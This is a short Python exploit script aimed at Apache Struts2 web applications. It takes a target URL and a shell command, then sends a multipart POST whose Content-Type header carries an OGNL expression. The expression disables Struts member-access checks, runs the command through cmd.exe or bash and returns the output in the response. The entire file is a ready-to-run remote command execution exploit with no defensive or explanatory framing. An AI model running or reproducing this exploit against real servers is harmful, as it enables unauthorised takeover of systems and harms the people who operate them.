import urllib.request
import sys
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

cmd = sys.argv[2]
# cd webapps\\ROOT & dir

def main():
    url = str(sys.argv[1])
    m = MultipartEncoder(fields={"image1": ("tmp.txt", open("tmp.txt", "rb"), "text/plain")})
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Host": "127.0.0.1",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Content-Type": '''%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd=' '''+cmd+''' ').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}'''
    }
    r = requests.post(url, data=m, headers=headers)
    print(r.text)

if __name__ == '__main__':
    main()
